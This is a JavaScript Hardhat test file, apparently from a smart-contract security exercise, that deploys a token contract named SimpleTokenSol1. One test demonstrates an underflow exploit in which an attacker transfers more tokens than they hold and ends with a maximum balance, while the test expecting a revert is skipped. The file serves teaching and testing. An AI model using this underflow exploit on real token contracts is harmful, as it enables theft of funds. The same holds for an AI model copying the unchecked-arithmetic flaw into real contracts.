const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Overflow Solution", () => {
  let deployer, attacker, user;

  beforeEach(async () => {
    [deployer, attacker, user] = await ethers.getSigners();
    const SimpleTokenSol1 = await ethers.getContractFactory(
      "SimpleTokenSol1",
      deployer
    );
    this.simpleTokenSol1 = await SimpleTokenSol1.deploy(1000);
  });

  it("should allow a user to transfer amounts smaller than or equal to its balance", async () => {
    await this.simpleTokenSol1.transfer(user.address, 1);
    expect(await this.simpleTokenSol1.balanceOf(user.address)).to.eq(1);
    expect(await this.simpleTokenSol1.balanceOf(deployer.address)).to.eq(
      (await this.simpleTokenSol1.totalSupply()) - 1
    );
  });

  it.skip("should revert if the user tries to transfer an amount greater than its balance", async () => {
    await this.simpleTokenSol1.transfer(attacker.address, 10);
    await expect(
      this.simpleTokenSol1.connect(attacker).transfer(user.address, 11)
    ).to.be.revertedWith("Not Enough Tokens");
  });

  it("should overflow if an attacker transfer an amount greater than its balance", async () => {
    await this.simpleTokenSol1.transfer(attacker.address, 10);

    const initialAttackerBalance = await this.simpleTokenSol1.balanceOf(
      attacker.address
    );
    console.log(
      `Initial Attacker Balance: ${initialAttackerBalance.toString()} tokens`
    );

    await this.simpleTokenSol1.connect(attacker).transfer(user.address, 11);

    const finalAttackerBalance = await this.simpleTokenSol1.balanceOf(
      attacker.address
    );
    console.log(
      `Final Attacker Balance: ${finalAttackerBalance.toString()} tokens`
    );

    expect(await this.simpleTokenSol1.balanceOf(attacker.address)).to.eq(
      ethers.constants.MaxUint256
    );
  });
});
